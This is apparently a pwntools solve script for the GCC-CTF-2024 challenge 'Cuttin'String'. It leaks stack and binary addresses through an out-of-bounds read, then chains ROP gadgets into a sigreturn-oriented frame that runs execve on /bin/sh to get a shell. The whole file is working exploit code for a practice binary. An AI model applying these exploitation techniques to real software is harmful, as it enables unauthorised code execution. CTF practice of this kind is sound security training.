#!/usr/bin/env python3
from pwn import *
import sys

"""
@Author: Drahoxx
@CTF: GCC-CTF-2024
@Challenge: Cuttin'String
@TL;DR: 
    1. Leak stack and binary addresses through an out-of-bound read;
    2. ROP to call sigreturn;
    3. SROP to execute execve syscall with /bin/sh parameter.
"""

# Gadgets
zero_rax = 0x0000000000001000
inc_al = 0x000000000000100c
syscall = 0x0000000000001034
###

# Main definition
context.binary = e = ELF("./chall")
p = process("./chall")
###

# Debug
if "DEBUG" in sys.argv:
    print("Waiting for gdb attach (gdb -p <pid>)")
    input()
###

# Interact with the program
def send_str(s: bytes, lgt: int):
    p.sendline(f"{lgt}".encode())
    p.read()
    p.sendline(s)
    p.readuntil(b"\x00")
###

# Solve script
p.read()
send_str(b"A"*500, 1024)

leak = p.read()
leaks = []
print("Leaked addresses are:")
for i in range(15):
    lk = u64(leak[1 + i * 8:1 + 8 + i * 8])
    leaks.append(lk)
    print(f"{i} : {hex(lk)}")

# Leak 5 is __main_loop+5
e.addr = leaks[5] - e.sym["__main_loop"] - 5
# Leak 0 is stack address of /bin/sh + 536 
addr_bin_sh = leaks[0] - 536

print(f"@binary = {hex(e.addr)}")
print(f"@base_stack = {hex(addr_bin_sh)}")

# ROP
PAYLOAD = b"/bin/sh\x00" + b"A" * 512  # fill the buffer
# xor rax, rax ; inc al ; ...(* 0xf) ; syscall
# https://man7.org/linux/man-pages/man2/rt_sigreturn.2.html
PAYLOAD += p64(zero_rax + e.addr)
PAYLOAD += p64(inc_al + e.addr) * 0xf
PAYLOAD += p64(syscall + e.addr)  # syscall

# SROP
srop_frame = SigreturnFrame()
srop_frame.rax = constants.SYS_execve
srop_frame.rdi = addr_bin_sh
srop_frame.rsi = 0
srop_frame.rdx = 0
srop_frame.rip = syscall + e.addr

PAYLOAD += bytes(srop_frame)

send_str(PAYLOAD, 13)
###

p.interactive()
